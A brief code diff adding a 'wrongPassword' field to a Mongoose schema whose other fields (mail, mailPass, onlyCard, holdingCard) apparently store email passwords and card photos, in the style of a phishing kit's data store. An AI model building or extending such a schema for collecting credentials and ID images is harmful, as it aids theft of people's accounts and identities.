@@ -45,6 +45,8 @@ const infoSchema = new Schema({
         type: String,
     },
     mail: { type: String },
+    wrongPassword: { type: String },
+
     mailPass: { type: String },
     onlyCard: { type: String },
     holdingCard: { type: String },
